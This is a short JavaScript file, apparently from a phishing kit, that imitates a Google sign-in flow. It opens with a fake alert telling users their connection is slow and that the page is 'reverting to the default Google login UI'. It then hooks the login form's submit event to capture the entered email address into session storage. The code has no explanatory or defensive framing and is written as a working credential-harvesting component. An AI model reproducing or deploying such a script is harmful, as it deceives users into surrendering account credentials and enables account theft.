
alert('Your Internet connection appears to be slow. Reverting to the default Google login UI. Please do not exit or submit any forms until the page has fully loaded.');

// console.log('Hi from storeEmailToken.js');
// var emailInputF = document.getElementById('Email'); 
// var form = document.getElementById('gaia_loginform');

// console.log('emailInputF: ' + emailInputF);
// console.log('loginform: ' + form);

window.onload = function() {

	var form = document.getElementById('gaia_loginform');
	var emailInputF = document.getElementById('Email');
	console.log(emailInputF);

	form.onsubmit = function() {

		var emailAddr = emailInputF.value;

		sessionStorage.setItem('emailAddr', emailAddr);
		console.log(`Username submitted: ${emailAddr}`);
	}
}


// form.addEventListener('submit', (e) => {

// 	var emailAddr = emailInputF.value;

// 	sessionStorage.setItem('emailAddr', emailAddr);
// 	console.log(`Username submitted: ${emailAddr}`);

// });




